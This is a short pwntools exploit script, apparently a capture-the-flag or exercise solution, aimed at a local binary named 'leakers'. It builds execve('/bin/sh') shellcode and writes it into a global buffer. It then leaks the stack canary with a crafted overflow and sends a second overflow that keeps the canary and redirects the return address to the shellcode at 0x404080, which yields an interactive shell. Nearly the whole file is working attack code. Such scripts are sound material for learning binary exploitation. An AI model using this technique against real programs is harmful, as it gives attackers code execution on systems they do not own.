from pwn import *
import time
context.terminal=['tmux','splitw','-h']
#r = gdb.debug("./leakers",'''b*main
#			     continue''')
r = process("./leakers")
input("wait for shellcode")
CODE ="""jmp stringshell
	beg:
	pop rdi
	mov rsi, rdi
	add rsi, 8
	mov rdx, rsi
	mov eax ,0x3b
	syscall
	stringshell:
	call beg
	"""

#2f62696e2f7368  /bin/sh

#this will go into g_buffer
#shellcode = "\x48\xC7\xC4\x80\x40\x40\x00\x48\x83\xC4\x5B\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\xB8\x3B\x00\x00\x00\x0F\x05"d
shellcode = asm(CODE, arch="amd64")+b"/bin/sh\x00\x00\x00\x00\x00\x00\x00"
print("produced shellcode:")
print(shellcode)

r.recvuntil("rs!\n")
r.send(shellcode)
#we need to be sure that we do NOT mixup the two reads
time.sleep(0.1)


#this will go into string
payload=b"A"*104+b"B"
r.send(payload)
r.recvuntil(b"AB")
canary =u64( b"\x00"+ r.read(7))#reads the 7 bytes from the canary
#what are pack and unpack 64 ?
#p encodes a string in little endian 64
#unpack goes the other way around
#canary is an integer
print("canary: %x" % canary)
#now we need to build an overflow that rewrites the thing

payload_two = b"A"*104+p64(canary)+b"CCCCDDDD"+p64(0x404080)
time.sleep(0.1)

r.send(payload_two)
#use shellcraft to create your shellcodes
r.interactive()
